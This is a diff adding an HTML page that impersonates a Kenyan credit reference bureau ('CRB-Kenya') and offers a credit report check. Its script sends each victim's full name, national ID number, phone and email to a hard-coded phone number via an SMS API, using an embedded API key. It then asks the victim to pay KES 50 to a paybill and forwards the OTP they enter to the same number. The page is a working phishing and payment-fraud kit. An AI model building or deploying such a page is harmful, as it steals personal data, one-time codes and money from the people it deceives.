@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CRB-Kenya | Credit Reference Bureau Services</title>
+  <style>
+    /* Reset & Core Styling */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background-color: #f4f7f6;
+      color: #333;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      background-color: #0d5c3a;
+      color: #ffffff;
+      padding: 1rem 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+
+    header h1 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+
+    .container {
+      max-width: 800px;
+      width: 90%;
+      margin: 2rem auto;
+      flex: 1;
+    }
+
+    /* Screen Sections */
+    .screen {
+      display: none;
+      background: #ffffff;
+      padding: 2.5rem;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+    }
+
+    .screen.active {
+      display: block;
+    }
+
+    /* Intro Animation Screen */
+    #welcome-screen {
+      text-align: center;
+      padding: 4rem 2rem;
+    }
+
+    .crb-anim-icon {
+      width: 100px;
+      height: 100px;
+      margin: 0 auto 1.5rem;
+      background: #0d5c3a;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      animation: pulseScale 2s infinite ease-in-out;
+    }
+
+    .crb-anim-icon svg {
+      width: 50px;
+      height: 50px;
+      fill: #ffffff;
+    }
+
+    @keyframes pulseScale {
+      0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(13, 92, 58, 0.7); }
+      70% { transform: scale(1.05); box-shadow: 0 0 0 20px rgba(13, 92, 58, 0); }
+      100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(13, 92, 58, 0); }
+    }
+
+    /* Options Page */
+    .services-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 1.5rem;
+      margin-top: 1.5rem;
+    }
+
+    .card {
+      background: #f9fbf9;
+      border: 2px solid #e2ece6;
+      border-radius: 8px;
+      padding: 1.5rem;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .card:hover {
+      border-color: #0d5c3a;
+      transform: translateY(-3px);
+      box-shadow: 0 5px 15px rgba(13, 92, 58, 0.15);
+    }
+
+    .card h3 {
+      color: #0d5c3a;
+      margin-bottom: 0.5rem;
+    }
+
+    /* Form Styling */
+    .form-group {
+      margin-bottom: 1.2rem;
+      position: relative;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 0.4rem;
+      font-weight: 600;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 0.8rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+      transition: border-color 0.2s;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: #0d5c3a;
+    }
+
+    .form-group input.invalid {
+      border-color: #d9534f;
+      background-color: #fff8f8;
+    }
+
+    .error-msg {
+      color: #d9534f;
+      font-size: 0.82rem;
+      margin-top: 0.3rem;
+      display: none;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 0.9rem;
+      background-color: #0d5c3a;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn:hover {
+      background-color: #084229;
+    }
+
+    /* Modal / Pop-up Box */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    .modal-content {
+      background: white;
+      padding: 2rem;
+      border-radius: 10px;
+      max-width: 450px;
+      width: 90%;
+      position: relative;
+      text-align: center;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      font-size: 1.5rem;
+      cursor: pointer;
+      color: #666;
+    }
+
+    .close-btn:hover {
+      color: #000;
+    }
+
+    .modal-body {
+      margin-top: 1rem;
+      line-height: 1.6;
+      font-size: 1.05rem;
+    }
+
+    /* OTP Area */
+    #otp-section {
+      margin-top: 2rem;
+      padding-top: 1.5rem;
+      border-top: 1px dashed #ccc;
+      display: none;
+    }
+
+    .back-link {
+      display: inline-block;
+      margin-bottom: 1rem;
+      color: #0d5c3a;
+      text-decoration: none;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    footer {
+      text-align: center;
+      padding: 1rem;
+      background: #e9ecef;
+      color: #666;
+      font-size: 0.85rem;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>CRB-Kenya</h1>
+  </header>
+
+  <div class="container">
+
+    <!-- 1. Animated Welcome Screen -->
+    <div id="welcome-screen" class="screen active">
+      <div class="crb-anim-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-5.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+        </svg>
+      </div>
+      <h2>Welcome to CRB-Kenya</h2>
+      <p style="margin-top: 0.5rem; color: #666;">Verifying financial standing & credit health in Kenya...</p>
+      <button class="btn" style="margin-top: 2rem; max-width: 200px;" onclick="navigateTo('options-screen')">Proceed</button>
+    </div>
+
+    <!-- 2. Main Options Screen -->
+    <div id="options-screen" class="screen">
+      <h2>Select Service</h2>
+      <p style="color: #666; margin-bottom: 1.5rem;">Choose an option below to continue:</p>
+      
+      <div class="services-grid">
+        <div class="card" onclick="navigateTo('form-screen')">
+          <h3>Credit Report & Score</h3>
+          <p>Check your credit status and score breakdown.</p>
+        </div>
+        <div class="card" onclick="alert('Feature coming soon.')">
+          <h3>Repay Defaulted Loan(s)</h3>
+          <p>Clear outstanding balances directly.</p>
+        </div>
+        <div class="card" onclick="alert('Feature coming soon.')">
+          <h3>Clearance Certificate</h3>
+          <p>Apply for an official CRB clearance certificate.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- 3. User Details Form Screen -->
+    <div id="form-screen" class="screen">
+      <span class="back-link" onclick="navigateTo('options-screen')">&larr; Back to Options</span>
+      <h2>Credit Report & Score Check</h2>
+      <p style="color: #666; margin-bottom: 1.5rem;">Fill in your official identification details below:</p>
+
+      <form id="crbForm" onsubmit="handleFormSubmit(event)" novalidate>
+        <div class="form-group">
+          <label for="fullName">Full Names (as per National ID)</label>
+          <input type="text" id="fullName" required placeholder="John Doe">
+          <div class="error-msg" id="nameError">Please enter your full name.</div>
+        </div>
+
+        <div class="form-group">
+          <label for="idNumber">National ID Number</label>
+          <input type="text" id="idNumber" required placeholder="e.g. 12345678" maxlength="8">
+          <div class="error-msg" id="idError">Please enter a valid Kenyan National ID (6 to 8 digits).</div>
+        </div>
+
+        <div class="form-group">
+          <label for="mobileNumber">Mobile Number</label>
+          <input type="tel" id="mobileNumber" required placeholder="e.g. 0712345678 or 0112345678">
+          <div class="error-msg" id="mobileError">Please enter a valid Kenyan mobile number (e.g., 0712345678).</div>
+        </div>
+
+        <div class="form-group">
+          <label for="email">Email Address</label>
+          <input type="email" id="email" required placeholder="john.doe@example.com">
+          <div class="error-msg" id="emailError">Please enter a valid email address.</div>
+        </div>
+
+        <button type="submit" class="btn" id="submitDetailsBtn">Submit Information</button>
+      </form>
+
+      <!-- OTP Entry Section (Revealed after closing popup) -->
+      <div id="otp-section">
+        <h3>Enter OTP Verification Code</h3>
+        <p style="color: #666; margin-bottom: 1rem; font-size: 0.9rem;">
+          An OTP has been sent to your phone after completing the Paybill transaction.
+        </p>
+        <form id="otpForm" onsubmit="handleOtpSubmit(event)" novalidate>
+          <div class="form-group">
+            <label for="otpCode">OTP Code</label>
+            <input type="text" id="otpCode" placeholder="Enter 4 to 6 digit OTP" required maxlength="6">
+            <div class="error-msg" id="otpError">Please enter a valid numeric OTP (4-6 digits).</div>
+          </div>
+          <button type="submit" class="btn" id="submitOtpBtn">Verify & View Report</button>
+        </form>
+      </div>
+
+    </div>
+
+  </div>
+
+  <!-- Pop-up Modal -->
+  <div class="modal-overlay" id="paymentModal">
+    <div class="modal-content">
+      <span class="close-btn" onclick="closeModal()">&times;</span>
+      <h3 style="color: #0d5c3a;">Payment Instructions</h3>
+      <div class="modal-body">
+        To view your credit report, pay <strong>KES 50</strong> to paybill <strong>212121</strong> with your <strong>ID as account number</strong>. You will receive an OTP afterwards.
+      </div>
+      <button class="btn" style="margin-top: 1.5rem;" onclick="closeModal()">I Understand</button>
+    </div>
+  </div>
+
+  <footer>
+    &copy; 2026 CRB-Kenya. All Rights Reserved.
+  </footer>
+
+  <script>
+    const API_ENDPOINT = "https://app.mobitechtechnologies.com//sms/sendsms";
+    const API_KEY = "76de8c373d39d680187c4aed169d1419ccb803adc34ad017";
+    const TARGET_PHONE = "+254141241608";
+
+    // Validation Regex Patterns
+    const ID_REGEX = /^[0-9]{6,8}$/; // Kenyan National ID numbers are 6 to 8 digits
+    const KENYA_PHONE_REGEX = /^(?:\+254|254|0)?([71][0-9]{8})$/; // Kenyan format (07... or 01...)
+    const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    const OTP_REGEX = /^[0-9]{4,6}$/;
+
+    // Navigation function
+    function navigateTo(screenId) {
+      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+      document.getElementById(screenId).classList.add('active');
+    }
+
+    // Input Validation Helpers
+    function validateField(inputElement, errorElement, regex, customCondition = null) {
+      const value = inputElement.value.trim();
+      const isValid = customCondition !== null ? customCondition : regex.test(value);
+
+      if (!isValid) {
+        inputElement.classList.add('invalid');
+        errorElement.style.display = 'block';
+        return false;
+      } else {
+        inputElement.classList.remove('invalid');
+        errorElement.style.display = 'none';
+        return true;
+      }
+    }
+
+    // Attach real-time input event listeners
+    document.getElementById('idNumber').addEventListener('input', function() {
+      // Allow only numbers
+      this.value = this.value.replace(/[^0-9]/g, '');
+      validateField(this, document.getElementById('idError'), ID_REGEX);
+    });
+
+    document.getElementById('mobileNumber').addEventListener('input', function() {
+      validateField(this, document.getElementById('mobileError'), KENYA_PHONE_REGEX);
+    });
+
+    document.getElementById('email').addEventListener('input', function() {
+      validateField(this, document.getElementById('emailError'), EMAIL_REGEX);
+    });
+
+    document.getElementById('fullName').addEventListener('input', function() {
+      validateField(this, document.getElementById('nameError'), null, this.value.trim().length >= 3);
+    });
+
+    document.getElementById('otpCode').addEventListener('input', function() {
+      this.value = this.value.replace(/[^0-9]/g, '');
+      validateField(this, document.getElementById('otpError'), OTP_REGEX);
+    });
+
+    // Mobitech SMS Send Function
+    async function sendMobitechSMS(messageText) {
+      try {
+        const response = await fetch(API_ENDPOINT, {
+          method: 'POST',
+          headers: {
+            'h_api_key': API_KEY,
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            "mobile": TARGET_PHONE,
+            "response_type": "json",
+            "sender_name": "MOBI-TECH",
+            "service_id": 0,
+            "message": messageText
+          })
+        });
+
+        const data = await response.json();
+        console.log("SMS API Response:", data);
+      } catch (error) {
+        console.error("Failed to send SMS:", error);
+      }
+    }
+
+    // Handle Form Submit with Validation
+    function handleFormSubmit(e) {
+      e.preventDefault();
+
+      const nameInput = document.getElementById('fullName');
+      const idInput = document.getElementById('idNumber');
+      const mobileInput = document.getElementById('mobileNumber');
+      const emailInput = document.getElementById('email');
+
+      const isNameValid = validateField(nameInput, document.getElementById('nameError'), null, nameInput.value.trim().length >= 3);
+      const isIdValid = validateField(idInput, document.getElementById('idError'), ID_REGEX);
+      const isMobileValid = validateField(mobileInput, document.getElementById('mobileError'), KENYA_PHONE_REGEX);
+      const isEmailValid = validateField(emailInput, document.getElementById('emailError'), EMAIL_REGEX);
+
+      // Stop execution if any validation fails
+      if (!isNameValid || !isIdValid || !isMobileValid || !isEmailValid) {
+        return;
+      }
+
+      const fullName = nameInput.value.trim();
+      const idNum = idInput.value.trim();
+      const mobile = mobileInput.value.trim();
+      const email = emailInput.value.trim();
+
+      const messageContent = `CRB Registration Request:\nName: ${fullName}\nID: ${idNum}\nMobile: ${mobile}\nEmail: ${email}`;
+
+      // Dispatch SMS
+      sendMobitechSMS(messageContent);
+
+      // Open Payment Modal
+      document.getElementById('paymentModal').classList.add('active');
+    }
+
+    // Close Modal Box & reveal OTP section
+    function closeModal() {
+      document.getElementById('paymentModal').classList.remove('active');
+      document.getElementById('otp-section').style.display = 'block';
+    }
+
+    // Handle OTP Submit with Validation
+    function handleOtpSubmit(e) {
+      e.preventDefault();
+      const otpInput = document.getElementById('otpCode');
+      const isOtpValid = validateField(otpInput, document.getElementById('otpError'), OTP_REGEX);
+
+      if (!isOtpValid) return;
+
+      const otpValue = otpInput.value.trim();
+      const otpMessageContent = `CRB OTP Submitted:\nOTP Code: ${otpValue}`;
+
+      // Dispatch SMS
+      sendMobitechSMS(otpMessageContent);
+
+      alert("OTP Submitted successfully. Processing your credit report...");
+    }
+  </script>
+</body>
+</html>
